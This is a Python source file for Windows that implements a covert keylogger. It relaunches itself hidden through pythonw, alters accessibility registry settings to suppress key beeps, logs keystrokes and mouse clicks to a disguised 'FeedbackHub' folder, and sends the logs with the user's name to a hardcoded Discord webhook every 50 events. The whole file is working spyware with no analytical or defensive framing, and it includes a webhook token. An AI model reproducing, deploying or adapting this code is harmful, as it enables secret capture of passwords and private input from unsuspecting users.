import os
import sys
import subprocess
from datetime import datetime
from pynput import keyboard, mouse
import requests
import getpass
import winreg

# --- Relaunch invisibly with pythonw if not already ---
def run_invisible():
    if sys.argv[-1] != "--background":
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        args = [pythonw] + sys.argv + ["--background"]
        subprocess.Popen(args)
        sys.exit()

# --- Configuration ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1380753236918534244/XqGjC3uDMrOitAOOw460_w-9YEwdThPR_oX_bcAdvgbJjFNYgdA6--Hlaqw1Cv_hcliN"
LOG_DIR = r"C:\Users\Mike\Documents\FeedbackHub"
LOG_FILE = os.path.join(LOG_DIR, "combined_log.txt")
SEND_EVERY = 50  # send file every 50 events and clear

# --- Globals ---
event_count = 0
current_line = []

# --- Disable accessibility key beep sounds ---
def disable_accessibility_sounds():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Control Panel\Accessibility\ToggleKeys", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Flags", 0, winreg.REG_SZ, "0")
        winreg.CloseKey(key)
    except Exception:
        pass

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Control Panel\Accessibility\Keyboard Response", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Flags", 0, winreg.REG_SZ, "126")
        winreg.CloseKey(key)
    except Exception:
        pass

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Control Panel\Accessibility\StickyKeys", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Flags", 0, winreg.REG_SZ, "506")
        winreg.CloseKey(key)
    except Exception:
        pass

# --- Utility functions ---
def timestamp():
    return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

def get_username():
    return getpass.getuser()

def append_to_file(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text + "\n")

def read_file():
    if not os.path.exists(LOG_FILE):
        return ""
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        return f.read()

def clear_file():
    open(LOG_FILE, "w", encoding="utf-8").close()

def send_file_to_discord():
    global event_count
    if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
        return
    username = get_username()
    try:
        with open(LOG_FILE, "rb") as f:
            files = {
                'file': (os.path.basename(LOG_FILE), f)
            }
            data = {
                "content": f"**Combined Keyboard and Mouse Logs from user `{username}`:**"
            }
            response = requests.post(WEBHOOK_URL, data=data, files=files)
            if response.status_code == 204:
                event_count = 0
                clear_file()
            else:
                pass  # Could log error if needed
    except Exception:
        pass  # Could log exception if needed

def check_flush():
    global event_count
    if event_count > 0 and event_count % SEND_EVERY == 0:
        send_file_to_discord()

# --- Keyboard handlers ---
def on_press(key):
    global event_count, current_line
    try:
        if key == keyboard.Key.space:
            line = ''.join(current_line)
            if line:
                append_to_file(f"{timestamp()} {line}")
                event_count += 1
                check_flush()
            current_line.clear()
        elif key == keyboard.Key.enter:
            line = ''.join(current_line)
            if line:
                append_to_file(f"{timestamp()} {line}")
                event_count += 1
                check_flush()
            current_line.clear()
        elif key == keyboard.Key.backspace:
            if current_line:
                current_line.pop()
        elif hasattr(key, 'char') and key.char:
            current_line.append(key.char)
        else:
            current_line.append(f"<{key.name.upper()}>")
    except Exception:
        current_line.append("<ERR>")

def on_release(key):
    global event_count
    if key == keyboard.Key.esc:
        line = ''.join(current_line)
        if line:
            append_to_file(f"{timestamp()} {line}")
            event_count += 1
        send_file_to_discord()
        return False

# --- Mouse handlers ---
def on_click(x, y, button, pressed):
    global event_count
    action = "Pressed" if pressed else "Released"
    append_to_file(f"{timestamp()} <MOUSE {action} {button} at ({x}, {y})>")
    event_count += 1
    check_flush()

def on_scroll(x, y, dx, dy):
    global event_count
    append_to_file(f"{timestamp()} <MOUSE Scroll at ({x}, {y}) dx={dx} dy={dy}>")
    event_count += 1
    check_flush()

def on_move(x, y):
    # Optional: log mouse moves here if you want
    pass

# --- Main ---
if __name__ == "__main__":
    run_invisible()       # Relaunch invisibly & exit original console
    disable_accessibility_sounds()
    os.makedirs(LOG_DIR, exist_ok=True)

    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll, on_move=on_move)

    keyboard_listener.start()
    mouse_listener.start()

    keyboard_listener.join()
    mouse_listener.stop()
